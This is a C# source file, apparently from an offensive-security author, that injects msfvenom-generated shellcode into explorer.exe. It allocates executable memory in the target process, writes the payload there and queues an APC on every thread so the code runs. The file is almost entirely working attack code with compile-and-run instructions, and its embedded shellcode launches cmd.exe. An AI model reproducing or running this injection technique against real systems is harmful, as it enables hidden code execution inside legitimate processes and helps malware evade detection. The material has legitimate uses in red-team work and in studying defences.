// APC injection into any process by @pwndizzle
// In this module I use QueueAPC to assign every thread in a specific process an APC to execute
// For threads to execute APCs the thread must enter the "alertable" state. I couldn't find any way to force this (aside from thread hijacking)
// Luckily threads in explorer very often are alertable making it the perfect target for exploitation
//
// TODO: Find a clean way to trigger alertable state
//
// To run:
// C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe apc-injection-any-process.cs && apc-injection-any-process.exe


using System;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;


public class ApcInjectionAnyProcess
{
	public static void Main()
	{	
        //msfvenom --platform windows --arch x64  -p windows/x64/exec CMD=cmd.exe  -f csharp

		byte[] shellcode = new byte[279] {0xfc,0x48,0x81,0xe4,0xf0,
            0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
            0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,
            0x48,0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,
            0x72,0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,
            0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,
            0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,
            0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,
            0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,
            0x50,0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,
            0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,
            0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,
            0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,
            0x24,0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,
            0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,
            0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
            0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
            0x41,0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,
            0x5d,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,
            0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x04,0x01,0x00,0x00,
            0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,
            0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x65,
            0x6c,0x6c,0x6f,0x00,0x68,0x65,0x6c,0x6c,0x6f,0x00};

		
		// Open process. "explorer" is a good target due to the large number of threads which will enter alertable state
		Process targetProcess = Process.GetProcessesByName("explorer")[0];
		IntPtr procHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

		// Allocate memory within process and write shellcode
		IntPtr resultPtr = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		IntPtr bytesWritten = IntPtr.Zero;
		bool resultBool = WriteProcessMemory(procHandle,resultPtr,shellcode,shellcode.Length, out bytesWritten);
		
		// Modify memory permissions on shellcode from XRW to XR
		uint oldProtect = 0;
		resultBool = VirtualProtectEx(procHandle, resultPtr, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
		
		// Iterate over threads and queueapc
		foreach (ProcessThread thread in targetProcess.Threads)
                {
			//Get handle to thread
			IntPtr tHandle = OpenThread(ThreadAccess.THREAD_HIJACK, false, (int)thread.Id);
			
			//Assign APC to thread to execute shellcode
			IntPtr ptr = QueueUserAPC(resultPtr, tHandle, IntPtr.Zero);
		  }
	}
	
	// Memory permissions
	private static UInt32 MEM_COMMIT = 0x1000;
	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
	private static UInt32 PAGE_READWRITE = 0x04;
	private static UInt32 PAGE_EXECUTE_READ = 0x20;
	
	// Process privileges
      const int PROCESS_CREATE_THREAD = 0x0002;
      const int PROCESS_QUERY_INFORMATION = 0x0400;
      const int PROCESS_VM_OPERATION = 0x0008;
      const int PROCESS_VM_WRITE = 0x0020;
      const int PROCESS_VM_READ = 0x0010;
	
	[Flags]
    public enum ThreadAccess : int
    {
      TERMINATE = (0x0001),
      SUSPEND_RESUME = (0x0002),
      GET_CONTEXT = (0x0008),
      SET_CONTEXT = (0x0010),
      SET_INFORMATION = (0x0020),
      QUERY_INFORMATION = (0x0040),
      SET_THREAD_TOKEN = (0x0080),
      IMPERSONATE = (0x0100),
      DIRECT_IMPERSONATION = (0x0200),
	    THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
	    THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
    }	
	
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
		int dwThreadId);
	
	[DllImport("kernel32.dll",SetLastError = true)]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
	
	[DllImport("kernel32.dll")]
	public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
	
	[DllImport("kernel32")]
	public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
		 Int32 size, UInt32 flAllocationType, UInt32 flProtect);
	
	[DllImport("kernel32.dll", SetLastError = true )]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
	Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
	
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
	
	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
	int dwSize, uint flNewProtect, out uint lpflOldProtect);
}
